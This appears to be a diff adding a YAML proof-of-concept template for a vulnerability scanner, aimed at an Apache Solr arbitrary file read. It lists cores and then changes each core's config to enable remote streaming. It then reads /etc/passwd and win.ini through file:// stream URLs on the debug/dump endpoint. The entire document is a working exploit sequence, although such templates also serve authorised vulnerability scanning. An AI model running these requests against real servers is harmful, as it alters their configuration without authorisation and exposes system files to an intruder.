@@ -1,0 +1,36 @@
+name: yaml-poc-Apache-Solr-fileread
+description: "任意文件读取"
+alwaysExecute: true
+matchCount: 3
+rules:
+  - method: GET
+    path: /solr/admin/cores?indexInfo=false&wt=json
+    expression:
+      status: 200
+      body_all: ["responseHeader"]    
+    search: >-
+      "name":"(?P<core>.+?)"
+  - method: POST
+    path: "/solr/{{core}}/config"
+    body: |
+      {"set-property" : {"requestDispatcher.requestParsers.enableRemoteStreaming":true}}
+    expression:
+      body_all: ["responseHeader"]
+  - method: POST
+    path: "/solr/{{core}}/debug/dump?param=ContentStreams"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: |
+      stream.url=file:///etc/passwd
+    expression:
+      status: 200
+      body_all: ["root:"]
+  - method: POST
+    path: "/solr/{{core}}/debug/dump?param=ContentStreams"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: |
+      stream.url=file:///c://windows/win.ini
+    expression:
+      status: 200
+      body_all: ["for 16-bit app support"]
